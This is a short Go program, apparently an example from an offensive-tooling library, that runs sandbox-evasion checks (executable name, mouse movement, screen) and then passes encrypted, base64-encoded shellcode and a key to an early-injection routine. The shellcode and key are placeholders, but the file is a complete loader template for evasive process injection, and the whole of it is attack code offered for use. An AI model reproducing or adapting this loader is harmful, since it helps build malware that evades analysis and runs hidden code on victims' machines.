package main

import (
	"github.com/MrTuxx/OffensiveGolang/pkg/evasion"
	early_injection "github.com/MrTuxx/OffensiveGolang/pkg/payloads/injections/EarlyInjection"
)

func main() {
	evasion.CheckNameEXE("main.exe")
	evasion.CheckMouse(5)
	evasion.CheckScreen()
	enc_string := "<SHELLCODE ENCRYPTED AND BASE64-ENCODED>"
	key := "<KEY BASE64-ENCODED>"

	early_injection.EarlyInjection(enc_string, key)
}
